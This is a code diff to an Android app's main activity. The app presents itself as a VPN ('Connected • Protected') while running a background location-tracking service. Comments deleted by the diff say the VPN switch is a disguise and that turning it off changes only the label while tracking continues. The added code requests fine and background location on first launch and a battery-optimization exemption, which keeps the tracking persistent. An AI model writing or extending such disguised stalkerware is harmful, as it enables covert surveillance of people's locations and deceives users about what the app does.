@@ -3,9 +3,11 @@ package com.secure.netcore
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.graphics.Color
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.view.Gravity
 import android.widget.Button
 import android.widget.LinearLayout
@@ -18,6 +20,7 @@ class MainActivity : android.app.Activity() {
 
     private lateinit var statusText: TextView
     private val PERM_REQUEST = 1001
+    private val PERM_BG_REQUEST = 1002
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -41,27 +44,21 @@ class MainActivity : android.app.Activity() {
         statusText = TextView(this).apply {
             text = "Подключено • Защищено"
             textSize = 16f
-            setTextColor(Color.parseColor("#2e7d32"))
             gravity = Gravity.CENTER
             setPadding(0, 16, 0, 0)
         }
 
-        // Переключатель — часть маскировки.
-        // ВКЛ: запускает фоновую службу (трекинг начинается).
-        // ВЫКЛ: меняет только надпись — трекинг ПРОДОЛЖАЕТ работать.
         vpnSwitch.setOnCheckedChangeListener { _, isChecked ->
             if (isChecked) {
                 if (hasPermissions()) {
                     ContextCompat.startForegroundService(
                         this, Intent(this, LocationService::class.java))
                     statusText.text = "Подключено • Защищено"
-                    statusText.setTextColor(Color.parseColor("#2e7d32"))
                 } else {
                     requestAllPermissions()
                 }
             } else {
                 statusText.text = "Отключено"
-                statusText.setTextColor(Color.parseColor("#9e9e9e"))
             }
         }
 
@@ -81,11 +78,22 @@ class MainActivity : android.app.Activity() {
         root.addView(statusText)
         root.addView(btnSettings)
         setContentView(root)
+
+        // ВСЕ РАЗРЕШЕНИЯ СРАЗУ ПРИ ПЕРВОМ ОТКРЫТИИ
+        requestAllPermissions()
     }
 
+    private fun hasFine(): Boolean =
+        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
+                PackageManager.PERMISSION_GRANTED
+
+    private fun hasBackground(): Boolean =
+        Build.VERSION.SDK_INT < 30 ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
+                PackageManager.PERMISSION_GRANTED
+
     private fun hasPermissions(): Boolean {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-            != PackageManager.PERMISSION_GRANTED) return false
+        if (!hasFine()) return false
         if (Build.VERSION.SDK_INT >= 33 &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
             != PackageManager.PERMISSION_GRANTED) return false
@@ -93,23 +101,49 @@ class MainActivity : android.app.Activity() {
     }
 
     private fun requestAllPermissions() {
-        val list = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION)
-        if (Build.VERSION.SDK_INT >= 30) {
-            list.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        // Шаг 1: точная геолокация + уведомления
+        if (!hasFine() || (Build.VERSION.SDK_INT >= 33 &&
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                    != PackageManager.PERMISSION_GRANTED)) {
+            val list = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION)
+            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
+            ActivityCompat.requestPermissions(this, list.toTypedArray(), PERM_REQUEST)
+            return
         }
-        if (Build.VERSION.SDK_INT >= 33) {
-            list.add(Manifest.permission.POST_NOTIFICATIONS)
+        // Шаг 2: фоновая геолокация (Android 10+ требует отдельного запроса)
+        if (Build.VERSION.SDK_INT >= 30 && !hasBackground()) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
+                PERM_BG_REQUEST
+            )
+            return
         }
-        ActivityCompat.requestPermissions(this, list.toTypedArray(), PERM_REQUEST)
+        // Шаг 3: отключение оптимизации батареи (системное окно, можно отклонить)
+        askBatteryOptimization()
+    }
+
+    private fun askBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= 23) {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    startActivity(Intent(
+                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:$packageName")
+                    ))
+                } catch (e: Exception) { }
+            }
+        }
     }
 
     override fun onRequestPermissionsResult(
         requestCode: Int, permissions: Array<out String>, grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == PERM_REQUEST && hasPermissions()) {
-            ContextCompat.startForegroundService(
-                this, Intent(this, LocationService::class.java))
+        when (requestCode) {
+            PERM_REQUEST -> requestAllPermissions()      // дальше по цепочке
+            PERM_BG_REQUEST -> askBatteryOptimization()
         }
     }
 }
